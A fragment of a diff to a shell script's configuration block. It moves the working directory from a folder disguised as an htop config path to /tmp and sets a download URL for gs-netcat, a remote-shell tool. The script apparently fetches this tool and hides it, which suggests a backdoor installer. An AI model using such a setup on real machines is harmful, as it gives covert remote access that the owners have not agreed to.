@@ -9,7 +9,7 @@
 
 # ========== 可配置参数 ==========
 
-WORK_DIR="/home1/virusin1/.config/htop"
+WORK_DIR="/tmp/"
 
 DOWNLOAD_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64"
 
